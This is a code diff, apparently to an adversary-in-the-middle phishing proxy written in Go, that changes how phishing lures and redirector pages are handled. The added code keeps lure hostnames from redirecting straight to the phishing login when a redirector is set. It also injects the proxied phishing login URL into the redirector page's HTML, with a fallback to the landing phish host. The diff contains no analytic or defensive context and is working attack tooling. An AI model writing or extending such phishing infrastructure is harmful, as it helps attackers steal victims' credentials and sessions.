@@ -634,7 +634,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
 
 									// if on a lure hostname, redirect to the phishing login page
-									if l.Hostname != "" && strings.EqualFold(l.Hostname, req.Host) {
+									// (skip if lure has a redirector - let the redirector page serve first)
+									if l.Hostname != "" && strings.EqualFold(l.Hostname, req.Host) && l.Redirector == "" {
 										landing_host := pl.GetLandingPhishHost()
 										if landing_host != "" {
 											login_url := pl.GetLoginUrl()
@@ -724,6 +725,21 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 											body := string(html)
 											body = p.replaceHtmlParams(body, lure_url, &s.Params)
+
+											// inject phishing login URL for redirector to use
+											login_url := pl.GetLoginUrl()
+											if lu, lerr := url.Parse(login_url); lerr == nil {
+												if ph, ok := p.replaceHostWithPhished(lu.Host); ok {
+													lu.Host = ph
+													body = strings.Replace(body, "{login_url}", lu.String(), -1)
+												} else {
+													// fallback: use landing phish host
+													landing_host := pl.GetLandingPhishHost()
+													if landing_host != "" {
+														body = strings.Replace(body, "{login_url}", "https://"+landing_host+lu.Path, -1)
+													}
+												}
+											}
 
 											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
 											if resp != nil {
